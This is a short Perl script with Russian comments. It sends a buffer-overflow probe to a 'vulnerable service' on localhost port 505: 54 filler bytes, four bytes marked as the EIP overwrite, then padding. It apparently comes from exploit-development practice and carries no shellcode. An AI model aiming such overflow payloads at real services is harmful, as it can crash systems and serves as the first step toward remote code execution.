use strict;
use Socket;
# передаваемый аргумент
my $bufff = "\x61" x54;
my $eip = "\x62" x4;
my $buffff = "\x63" x20;
# адрес и порт узявимого сервиса
my $host =  '127.0.0.1';
my $port =  505;
my $proto = getprotobyname('tcp');
# преобразование адреса в двоичный код
my $iaddr = inet_aton($host);
# привязка
my $paddr = sockaddr_in($port, $iaddr);
print "Setting up socket\n";
# создание сокета, подключение к заданному порту
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
print "Connecting to $host on port $port\n";
connect(SOCKET, $paddr) or die "connect: $!";
print "Sending payload\n";
print SOCKET $bufff.$eip.$buffff."\n";
print "Payload sent\n";
close SOCKET or die "close: $!";
